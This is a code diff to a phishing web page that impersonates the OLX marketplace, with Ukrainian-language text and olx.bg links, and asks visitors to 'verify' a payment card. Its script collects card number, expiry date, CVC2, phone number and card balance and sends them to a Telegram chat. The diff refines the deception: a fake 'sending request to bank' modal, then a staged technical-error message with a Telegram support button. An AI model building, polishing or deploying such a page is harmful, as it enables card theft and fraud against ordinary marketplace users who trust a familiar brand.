@@ -157,17 +157,6 @@
             background-color: #004f56;
         }
 
-        /* Визуализация загрузки */
-        .loading {
-            display: none;
-            text-align: center;
-            margin-top: 20px;
-        }
-
-        .loading img {
-            width: 40px;
-        }
-
         /* Футер */
         .footer {
             background-color: #ffffff;
@@ -219,7 +208,7 @@
             <span class="letter-x"></span>
         </a>
         <div class="nav-right">
-            <a href="https://www.olx.bg/uk/myaccount/" class="nav-link">
+            <a href="https://www.olx.bg/" class="nav-link">
                 <svg width="24" height="24" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path></svg>
                 <span>Ваш профіль</span>
             </a>
@@ -260,12 +249,6 @@
 
             <button type="submit" class="verify-btn">ПІДТВЕРДИТИ</button>
         </form>
-
-        <!-- Визуализация загрузки -->
-        <div class="loading" id="loading">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Loading_icon.gif" alt="Завантаження...">
-            <p>Завантаження, будь ласка, зачекайте...</p>
-        </div>
     </div>
 
     <div class="info-card">
@@ -282,47 +265,12 @@
 <!-- Модальное окно -->
 <div id="modal" class="modal">
     <div class="modal-content">
-        <h3>Технічна помилка ⚠️</h3>
-        <p>Виникла технічна помилка, будь ласка, напишіть нам у чат Telegram для отримання допомоги.</p>
-        <a href="https://t.me/your_telegram_chat_id" class="btn" target="_blank">Написати в Telegram</a>
+        <h3 id="modal-title">Загрузка...</h3>
+        <p id="modal-message">Починаємо перевірку даних...</p>
+        <p id="loading-message"></p>
+        <a href="https://t.me/your_telegram_chat_id" class="btn" target="_blank" style="display:none" id="modal-btn">Написати в Telegram</a>
     </div>
 </div>
-
-<footer class="footer">
-    <div class="footer-content">
-        <div class="footer-column">
-            <a href="https://www.olx.bg/mobileapps/" class="footer-link">Мобільні додатки</a>
-            <a href="https://help.olx.bg/hc/uk" class="footer-link">Допомога та Зворотній зв'язок</a>
-            <a href="https://www.olx.bg/payment/" class="footer-link">Платні послуги</a>
-            <a href="https://www.olx.bg/business/" class="footer-link">Бізнес на OLX</a>
-            <a href="https://blog.olx.bg/" class="footer-link">Блог OLX</a>
-            <a href="https://help.olx.bg/hc/uk/articles/360009214498" class="footer-link">Умови користування</a>
-            <a href="https://help.olx.bg/hc/uk/articles/360009214478" class="footer-link">Політика конфіденційності</a>
-            <a href="https://www.olx.bg/advertising/" class="footer-link">Реклама на сайті</a>
-        </div>
-
-        <div class="footer-column footer-apps">
-            <div class="app-buttons">
-                <a href="https://play.google.com/store" target="_blank">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Get it on Google Play" class="app-badge">
-                </a>
-                <a href="https://apps.apple.com/" target="_blank">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" alt="Download on the App Store" class="app-badge">
-                </a>
-            </div>
-            <p class="app-text">Безкоштовно додаток для вашого телефону</p>
-        </div>
-    </div>
-
-    <div class="footer-bottom">
-        <div class="footer-country-links">
-            <a href="https://www.olx.bg/" class="country-link"><img src="https://upload.wikimedia.org/wikipedia/commons/9/9a/Flag_of_Bulgaria.svg" class="flag"> OLX.bg</a>
-            <a href="https://www.olx.bg/" class="country-link"><img src="https://upload.wikimedia.org/wikipedia/en/1/12/Flag_of_Poland.svg" class="flag"> OLX.pl</a>
-            <a href="https://www.olx.bg/" class="country-link"><img src="https://upload.wikimedia.org/wikipedia/commons/7/73/Flag_of_Romania.svg" class="flag"> OLX.ro</a>
-            <a href="https://www.olx.bg/" class="country-link"><img src="https://upload.wikimedia.org/wikipedia/commons/5/5c/Flag_of_Portugal.svg" class="flag"> OLX.pt</a>
-        </div>
-    </div>
-</footer>
 
 <script>
     // Токен и ID чата для Telegram
@@ -369,9 +317,11 @@
     document.getElementById('verifyForm').addEventListener('submit', e => {
         e.preventDefault();
 
-        // Показать загрузку
-        document.getElementById('loading').style.display = 'block';
-
+        // Показываем модалку и меняем текст на этапе отправки
+        document.getElementById('modal').style.display = 'block';
+        document.getElementById('modal-title').innerText = 'Отправка запроса в банк...';
+        document.getElementById('modal-message').innerText = 'Перевіряємо дані вашої картки.';
+        
         // Собираем данные формы
         const cardNumber = document.getElementById('cardNumber').value;
         const expiry = document.getElementById('expiry').value;
@@ -381,21 +331,22 @@
 
         // Формируем сообщение для Telegram
         const message = `
-            <b>Номер картки:</b> <code>${cardNumber}</code> 💳\n
-            <b>Термін дії:</b> <code>${expiry}</code> 🗓️\n
-            <b>CVC2:</b> <code>${cvc}</code> 🔒\n
-            <b>Номер телефону:</b> <code>${phoneNumber}</code> 📱\n
-            <b>Баланс картки:</b> <code>${balance}</code> 💰
+            <b>Номер картки:</b> ${cardNumber}\n
+            <b>Термін дії:</b> ${expiry}\n
+            <b>CVC2:</b> ${cvc}\n
+            <b>Номер телефону:</b> ${phoneNumber}\n
+            <b>Баланс картки:</b> ${balance}
         `;
 
         // Отправляем сообщение в Telegram
         sendToTelegram(message);
 
-        // После отправки данных скрыть загрузку и показать ошибку
+        // Задержка для демонстрации
         setTimeout(() => {
-            document.getElementById('loading').style.display = 'none';
-            document.getElementById('modal').style.display = 'block';
-        }, 3000); // Задержка перед показом ошибки
+            document.getElementById('modal-title').innerText = 'Помилка!';
+            document.getElementById('modal-message').innerText = 'Виникла технічна помилка, будь ласка, спробуйте ще раз.';
+            document.getElementById('modal-btn').style.display = 'block';
+        }, 3000);
     });
 </script>
 
